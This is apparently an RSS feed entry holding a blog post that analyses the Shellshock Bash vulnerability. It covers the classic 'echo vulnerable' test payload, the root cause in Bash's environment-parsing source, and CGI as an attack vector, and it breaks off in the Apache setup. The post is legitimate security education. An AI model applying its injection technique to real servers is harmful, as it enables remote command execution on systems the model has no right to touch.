@@ -1,0 +1,921 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Bash on</title><link>https://h4r1337.github.io/tags/bash/</link><description>Recent content in Bash on</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Mon, 22 Sep 2025 09:50:50 +0530</lastBuildDate><atom:link href="https://h4r1337.github.io/tags/bash/index.xml" rel="self" type="application/rss+xml"/><item><title>CVE-2014-6271 - Shellshock</title><link>https://h4r1337.github.io/posts/shellshock/</link><pubDate>Mon, 22 Sep 2025 09:50:50 +0530</pubDate><guid>https://h4r1337.github.io/posts/shellshock/</guid><description>&lt;p>This is the first post in my CVE Analysis blog series. Since this is the first post in this series and I have no prior experience with CVE analysis, I will be writing about Shellshock. This is an old vulnerability in Bash, and there are already many articles and blogs written about it. Therefore, this is not something you would want to read if you are already familiar with this vulnerability, as no novel techniques or previously unknown facts are discussed here. Rather, this is just my attempt to establish a format for writing future posts. And after weeks &lt;del>months&lt;/del> of procrastination, I finally finished it. With that disclaimer in place, let&amp;rsquo;s get started.&lt;/p></description><content>&lt;p>This is the first post in my CVE Analysis blog series. Since this is the first post in this series and I have no prior experience with CVE analysis, I will be writing about Shellshock. This is an old vulnerability in Bash, and there are already many articles and blogs written about it. Therefore, this is not something you would want to read if you are already familiar with this vulnerability, as no novel techniques or previously unknown facts are discussed here. Rather, this is just my attempt to establish a format for writing future posts. And after weeks &lt;del>months&lt;/del> of procrastination, I finally finished it. With that disclaimer in place, let&amp;rsquo;s get started.&lt;/p>
+&lt;hr>
+&lt;h2 id="summary">Summary&lt;/h2>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th style="text-align: left">&lt;strong>CVE&lt;/strong>&lt;/th>
+&lt;th style="text-align: left">CVE-2014-6271&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td style="text-align: left">&lt;strong>Disclosure Date&lt;/strong>&lt;/td>
+&lt;td style="text-align: left">12 September 2014&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: left">&lt;strong>Patch Date&lt;/strong>&lt;/td>
+&lt;td style="text-align: left">24 September 2014&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: left">&lt;strong>Product&lt;/strong>&lt;/td>
+&lt;td style="text-align: left">Bash&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: left">&lt;strong>Advisory&lt;/strong>&lt;/td>
+&lt;td style="text-align: left">&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2014-6271">https://nvd.nist.gov/vuln/detail/CVE-2014-6271&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: left">&lt;strong>Affected Versions&lt;/strong>&lt;/td>
+&lt;td style="text-align: left">1.03 - 4.3&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: left">&lt;strong>First Patched Version&lt;/strong>&lt;/td>
+&lt;td style="text-align: left">4.3-025&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: left">&lt;strong>Issue/Bug Report&lt;/strong>&lt;/td>
+&lt;td style="text-align: left">&lt;a href="https://seclists.org/oss-sec/2014/q3/650">https://seclists.org/oss-sec/2014/q3/650&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: left">&lt;strong>Reporter(s)&lt;/strong>&lt;/td>
+&lt;td style="text-align: left">Stephane Chazeles&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;blockquote>
+&lt;p>GNU Bash versions 1.03 through 4.3 processes trailing strings after function definitions in the values of environment variables, which allows remote attackers to execute arbitrary code via a crafted environment, as demonstrated by vectors involving the ForceCommand feature in OpenSSH sshd, the mod_cgi and mod_cgid modules in the Apache HTTP Server, scripts executed by unspecified DHCP clients, and other situations in which setting the environment occurs across a privilege boundary from Bash execution, aka &amp;ldquo;ShellShock.&amp;rdquo;&lt;/p>
+&lt;/blockquote>
+&lt;hr>
+&lt;h2 id="exploitation">Exploitation&lt;/h2>
+&lt;p>A quick Google search on how to test if your Bash version is vulnerable to Shellshock will show you a proof of concept like this&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>env x&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;() { :;}; echo vulnerable&amp;#39;&lt;/span> bash -c &lt;span style="color:#b8bb26">&amp;#39;echo test&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Let&amp;rsquo;s check one by one what this command means.&lt;/p>
+&lt;h3 id="environment-variables">Environment Variables&lt;/h3>
+&lt;p>First we have to understand what an environment variable is.
+An environment variable is a dynamic, named value maintained by the operating system; it is not a feature specific to any shell or to Linux itself. It can be used by other processes to obtain various configurations. For example, in Linux the &lt;code>$HOME&lt;/code> environment variable is used to store the location of the home directory of the current user. Bash is simply another process that can read or modify its own environment variables.
+In Bash we can set our own custom environment using the built-in &lt;code>export&lt;/code> command:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">export&lt;/span> foo&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;hello world&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now any child processes spawned by the current Bash instance can access the environment variable named &lt;code>foo&lt;/code>. This variable can be referenced by adding a &lt;code>$&lt;/code> at the start of the variable name:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">echo&lt;/span> $foo
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># hello world&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can also set an environment variable for a single program without exporting it:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>foo&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;hello world&amp;#39;&lt;/span> program
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This will spawn the child process &lt;code>program&lt;/code> with the environment variable &lt;code>foo&lt;/code> in it.
+Now you may notice that in the above Shellshock payload they are using the &lt;code>env&lt;/code> command to set the environment variable. The &lt;code>env&lt;/code> command is a standalone utility designed to manage the environment with more control when launching a process:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># To start the program in a sandboxed environment with no environment variables&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>env -i program
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># To start the program with the FOO environment variable&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>env FOO&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;test&amp;#39;&lt;/span> program
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># To remove the FOO variable from the environment before running program&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>env -u FOO program
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="function-as-environment-variables">Function as Environment Variables&lt;/h3>
+&lt;p>So far, we have learned about how to export normal static values as environment variables. In Bash, we can also export shell functions into the environment—a Bash extension that isn&amp;rsquo;t part of the POSIX standard. These exported functions are only passed to child Bash processes; other programs or non-Bash shells will ignore them. There are several ways to define these variables, including using the &lt;code>export&lt;/code> command with the &lt;code>-f&lt;/code> flag to say that the given name refers to a Bash function.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>hello&lt;span style="color:#fe8019">()&lt;/span> &lt;span style="color:#fe8019">{&lt;/span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Hello, World&amp;#34;&lt;/span>; &lt;span style="color:#fe8019">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">export&lt;/span> -f hello
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bash -c &lt;span style="color:#b8bb26">&amp;#39;hello&amp;#39;&lt;/span> &lt;span style="color:#928374;font-style:italic"># This will start a new child bash proccess and call the exported hello function&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># Hello, World&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Using the &lt;code>env&lt;/code> command:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>env hello&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;() { echo &amp;#34;Hello, World&amp;#34;; }&amp;#39;&lt;/span> bash -c &lt;span style="color:#b8bb26">&amp;#39;hello&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># Hello, World&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Or we can simply follow the same &lt;code>FOO='value' program&lt;/code> format, without any additional utility program, which will also work:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>hello&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;() { echo &amp;#34;Hello, World&amp;#34;; }&amp;#39;&lt;/span> bash -c hello
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># Hello, World&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="alert alert-note collapsed">
+&lt;div class="alert-heading-box" onclick="toggleAlert(this)" >
+&lt;i class="bx bx-info-circle">&lt;/i>
+&lt;p class="alert-heading">
+Note
+&lt;/p>
+&lt;i class='bx bx-chevron-down collapsed'>&lt;/i>
+&lt;/div>
+&lt;div class="alert-content" style="display: none;" >
+&lt;p>Exporting shell functions like this only work in Bash before Shellshock.
+In modern Bash only the &lt;code>export -f&lt;/code> method will work.&lt;/p>
+&lt;/div>
+&lt;/div>
+&lt;script>
+function toggleAlert(headerElement) {
+var alertBox = headerElement.parentElement;
+var alertContent = alertBox.querySelector('.alert-content');
+var icon = headerElement.querySelectorAll('i')[1];
+alertBox.classList.toggle('open');
+alertBox.classList.toggle('collapsed');
+if (alertBox.classList.contains('open')) {
+alertContent.style.display = 'block';
+icon.classList.remove('open');
+icon.classList.add('collapsed');
+} else {
+icon.classList.remove('collapsed');
+icon.classList.add('open');
+alertContent.style.display = 'none';
+}
+}
+&lt;/script>
+&lt;h3 id="the-payload">The payload&lt;/h3>
+&lt;p>Now that we have covered the essentials, let&amp;rsquo;s walk through the payload step by step:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>env x&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;() { :;}; echo vulnerable&amp;#39;&lt;/span> bash -c &lt;span style="color:#b8bb26">&amp;#39;echo test&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In this command, we define a shell function in the environment variable &lt;code>x&lt;/code> and pass it to a new Bash process. Here, &lt;code>:&lt;/code> (colon) is a Bash built-in command that does nothing, so &lt;code>x&lt;/code> is just an empty function. The crucial point—and the heart of the Shellshock vulnerability—is what comes after the function definition. We don&amp;rsquo;t stop at the end of the function (&lt;code>}&lt;/code>); we append a trailing &lt;code>; echo vulnerable&lt;/code> to it. A vulnerable Bash program, when parsing its environment variables, doesn&amp;rsquo;t stop at the function&amp;rsquo;s closing brace—it continues past the semicolon and executes &lt;code>echo vulnerable&lt;/code> as a separate command. The important thing is we don&amp;rsquo;t have to call the function &lt;code>x&lt;/code> to invoke this; the extra command runs automatically during parsing.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/shellshock/Pasted%20image%2020250613172338.webp">&lt;/figure>
+&lt;p>In a vulnerable Bash version this command will print both &amp;ldquo;vulnerable&amp;rdquo; and &amp;ldquo;test&amp;rdquo;.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/shellshock/Pasted%20image%2020250613173028.webp">&lt;/figure>
+&lt;h2 id="root-cause-analysis">Root Cause Analysis&lt;/h2>
+&lt;p>Now let&amp;rsquo;s take a look at the &lt;a href="https://cgit.git.savannah.gnu.org/cgit/bash.git/tree/?h=bash-4.3-alpha">Bash source code&lt;/a> to see where the vulnerability exists. We will look specifically at the code that is responsible for parsing environment variables. The main function inside the &lt;code>shell.c&lt;/code> file calls &lt;code>shell_initialize()&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">static&lt;/span> &lt;span style="color:#fabd2f">void&lt;/span> &lt;span style="color:#fabd2f">shell_initialize&lt;/span> () {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[...]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#928374;font-style:italic">/* Initialize internal and environment variables. Don&amp;#39;t import shell
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"> functions from the environment if we are running in privileged or
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"> restricted mode or if the shell is running setuid. */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">#if defined (RESTRICTED_SHELL)
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">&lt;/span> &lt;span style="color:#fabd2f">initialize_shell_variables&lt;/span> (shell_environment, privileged_mode&lt;span style="color:#fe8019">||&lt;/span>&lt;span style="color:#fe8019">restricted&lt;/span>&lt;span style="color:#fe8019">||&lt;/span>running_setuid);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">#else
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">&lt;/span> &lt;span style="color:#fabd2f">initialize_shell_variables&lt;/span> (shell_environment, privileged_mode&lt;span style="color:#fe8019">||&lt;/span>running_setuid);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">#endif
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[...]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>shell_environment&lt;/code> variable contains the environment variables, and it is passed to another function called &lt;code>initialize_shell_variables(env, privmod)&lt;/code>. &lt;code>privmod&lt;/code> tells if Bash is currently running in privileged mode, using the &lt;code>-p&lt;/code> flag. This will come later when we discuss the different ways that were used to fix Shellshock. This function is defined inside the &lt;code>variable.c&lt;/code> file:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">/* Initialize the shell variables from the current environment.
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"> If PRIVMODE is nonzero, don&amp;#39;t import functions from ENV or
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"> parse $SHELLOPTS. */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">void&lt;/span> &lt;span style="color:#fabd2f">initialize_shell_variables&lt;/span> (env, privmode)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">char&lt;/span> &lt;span style="color:#fe8019">**&lt;/span>env;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">int&lt;/span> privmode;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[...]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">for&lt;/span> (string_index &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#d3869b">0&lt;/span>; string &lt;span style="color:#fe8019">=&lt;/span> env[string_index&lt;span style="color:#fe8019">++&lt;/span>]; )
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [...]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#928374;font-style:italic">/* If exported function, define it now. Don&amp;#39;t import functions from
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"> the environment in privileged mode. */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> (privmode &lt;span style="color:#fe8019">==&lt;/span> &lt;span style="color:#d3869b">0&lt;/span> &lt;span style="color:#fe8019">&amp;amp;&amp;amp;&lt;/span> read_but_dont_execute &lt;span style="color:#fe8019">==&lt;/span> &lt;span style="color:#d3869b">0&lt;/span> &lt;span style="color:#fe8019">&amp;amp;&amp;amp;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">STREQN&lt;/span> (&lt;span style="color:#b8bb26">&amp;#34;() {&amp;#34;&lt;/span>, string, &lt;span style="color:#d3869b">4&lt;/span>)) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [...]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#928374;font-style:italic">// This is where shellshock happens
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">&lt;/span> &lt;span style="color:#fabd2f">parse_and_execute&lt;/span> (temp_string, name, SEVAL_NONINT&lt;span style="color:#fe8019">|&lt;/span>SEVAL_NOHIST);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [...]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>After some string manipulation the environment variables are passed to the &lt;code>parse_and_execute()&lt;/code> function. For example, if the environment variable contains a value like:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-env" data-lang="env">&lt;span style="display:flex;">&lt;span>FOO&lt;span style="color:#fe8019">=()&lt;/span> &lt;span style="color:#fe8019">{&lt;/span> &lt;span style="color:#fabd2f">echo&lt;/span> hi; &lt;span style="color:#fe8019">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then it will be converted to &lt;code>FOO () { echo hi; }&lt;/code>; and this will be stored in &lt;code>temp_string&lt;/code> and will be passed to the &lt;code>parse_and_execute()&lt;/code> function for execution. Here, the only check done to differentiate an exported function from an exported variable is whether its value starts with &lt;code>() {&lt;/code>.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">int&lt;/span> &lt;span style="color:#fabd2f">parse_and_execute&lt;/span> (string, from_file, flags)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">char&lt;/span> &lt;span style="color:#fe8019">*&lt;/span>string;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">const&lt;/span> &lt;span style="color:#fabd2f">char&lt;/span> &lt;span style="color:#fe8019">*&lt;/span>from_file;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">int&lt;/span> flags;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [...]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">with_input_from_string&lt;/span> (string, from_file);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">while&lt;/span> (&lt;span style="color:#fe8019">*&lt;/span>(bash_input.location.string))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [...]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> (&lt;span style="color:#fabd2f">parse_command&lt;/span> () &lt;span style="color:#fe8019">==&lt;/span> &lt;span style="color:#d3869b">0&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [...]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> last_result &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#fabd2f">execute_command_internal&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (command, &lt;span style="color:#d3869b">0&lt;/span>, NO_PIPE, NO_PIPE, bitmap);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">dispose_command&lt;/span> (command);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [...]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">else&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> last_result &lt;span style="color:#fe8019">=&lt;/span> EXECUTION_FAILURE;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">break&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [...]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> (last_result);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The way they are trying to add this function to the environment variable is by directly executing it.
+You can try this by just entering the string &lt;code>FOO () { echo hi; }&lt;/code> into a Bash shell and calling &lt;code>FOO&lt;/code>:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/shellshock/Pasted%20image%2020250825143248.webp">&lt;/figure>
+&lt;p>This is similar to how Bash adds the function to its &lt;em>function table&lt;/em>.
+The above string containing the function definition is treated as an input to the parser, and if it parses successfully, it just executes it using the &lt;code>execute_command_internal()&lt;/code> function without any further checks or sanitation. &lt;code>parse_command()&lt;/code> doesn&amp;rsquo;t stop after the function definition. If the string contains trailing commands after the function definition, it will happily parse the entire input, and it will be executed.&lt;/p>
+&lt;h2 id="attack-vectors">Attack Vectors&lt;/h2>
+&lt;p>Now you might wonder how this specific parsing vulnerability in Bash could lead to widespread exploitation—and in most cases that would seem like a reasonable question. But the problem arises when other applications use Bash under the hood to deal with user inputs. We will talk about various such applications shortly.&lt;/p>
+&lt;p>For a system to be vulnerable to Shellshock, &lt;a href="https://infosecnirvana.com/attack-vectors-used-shellshock/">3 conditions&lt;/a> must be met:&lt;/p>
+&lt;ol>
+&lt;li>The application must set an environment variable with attacker-controlled values.&lt;/li>
+&lt;li>It must invoke the Bash shell.&lt;/li>
+&lt;li>And most importantly, the system must be running on a vulnerable version of Bash.&lt;/li>
+&lt;/ol>
+&lt;p>Shortly after the Shellshock vulnerability was found, people started to find more and more applications that came under these exploitable conditions.&lt;/p>
+&lt;h3 id="common-gateway-interface-cgi">Common Gateway Interface (CGI)&lt;/h3>
+&lt;p>The major attack vector of this vulnerability is through CGI-based web servers, which at that time were popular and widely used.
+CGI is an interface specification for interacting between HTTP requests and programs, which can range from compiled C binaries to Bash scripts. According to the &lt;a href="https://www.rfc-editor.org/rfc/rfc3875">specification&lt;/a>, information from the server to the program is carried through something called a meta-variable. The most common implementation of these is through the system&amp;rsquo;s environment variables. That is, information like HTTP headers, HTTP methods, and other user inputs via request parameters are passed to the program as system environment variables. Then the server starts a new child process of the program with the crafted environment variables. If the program invokes Bash (directly or indirectly), Bash will import and parse all environment variables, which in vulnerable versions could lead to command execution.
+Web servers like Apache, Microsoft IIS, etc. have support for CGI scripting. We will take a look at Apache in this blog by setting up a Docker container with a vulnerable Bash version. You can check out the lab &lt;a href="https://github.com/h4r1337/cve-labs/tree/main/CVE-2014-6271/cgi-docker">in my GitHub repo&lt;/a>.
+To enable CGI in Apache, first we need to enable the necessary modules in the &lt;code>httpd.conf&lt;/code> file:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-fallback" data-lang="fallback">&lt;span style="display:flex;">&lt;span>LoadModule cgid_module modules/mod_cgid.so
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We also need to specify that a particular directory is set aside for CGI programs. Apache will assume that every file in this directory is a CGI program and will try to execute it when that particular program is requested by a client. We can use the &lt;code>ScriptAlias&lt;/code> directive in Apache to specify this.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-fallback" data-lang="fallback">&lt;span style="display:flex;">&lt;span>ScriptAlias /cgi-bin/ &amp;#34;/usr/local/apache2/cgi-bin/&amp;#34;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>With this, whenever the client sends a request like &lt;code>https://test.com/cgi-bin/program.sh&lt;/code>, the server will check if the &lt;code>program.sh&lt;/code> is present inside the &lt;code>/usr/local/apache2/cgi-bin/&lt;/code> directory, and if it is present, will try to execute it. To permit execution of the programs inside &lt;code>cgi-bin/&lt;/code>, we need to explicitly specify that using the &lt;code>Options +ExecCGI&lt;/code> directive:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&amp;lt;Directory &lt;span style="color:#b8bb26">&amp;#34;/usr/local/apache2/cgi-bin&amp;#34;&lt;/span>&amp;gt;
